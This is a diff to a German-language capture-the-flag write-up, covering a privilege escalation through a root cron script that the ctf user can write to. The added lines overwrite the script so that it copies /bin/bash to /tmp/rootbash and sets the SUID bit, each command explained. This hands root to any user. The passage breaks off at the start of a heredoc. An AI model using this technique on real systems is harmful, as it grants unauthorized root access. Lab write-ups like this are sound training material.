@@ -164,13 +164,26 @@ Flag auslesen:
 
 ## Flag 4: Privilege Escalation via Cron
 Mechanismus:
-cron-backup.sh läuft jede Minute als root aber der Nutzer CTF hat Lese und Schreibzugriff darauf
+cron-backup.sh läuft jede Minute als root aber der Nutzer CTF hat Lese und Schreibzugriff darau
 
 
 Exploit-Steps:
 
-Als ctf /usr/local/bin/cron-backup.sh überschreiben:
+Überschreiben des Cronjobs um eigene Rootshell die jedem Nutzer zugänglich ist zu erstellen:
+#!/bin/bash
+Legt die Bash als Interpreter fest.
 
+cp /bin/bash /tmp/rootbash
+Kopiert die System-Shell (/bin/bash) nach /tmp/rootbash.
+
+chmod +s /tmp/rootbash
+Setzt das SUID-Bit auf die kopierte Shell, wodurch jeder, der /tmp/rootbash ausführt, sie mit den Rechten des Dateieigentümers (hier: root) startet.
+
+chmod +x /usr/local/bin/cron-backup.sh
+Macht das soeben angelegte Skript ausführbar, damit der Cron-Daemon es bei seiner nächsten Ausführung (in der Regel als root) laufen lässt und so die suid-versehene Bash ablegt.
+
+
+Als ctf /usr/local/bin/cron-backup.sh überschreiben:
 
     cat > /usr/local/bin/cron-backup.sh <<'EOF'
     #!/bin/bash
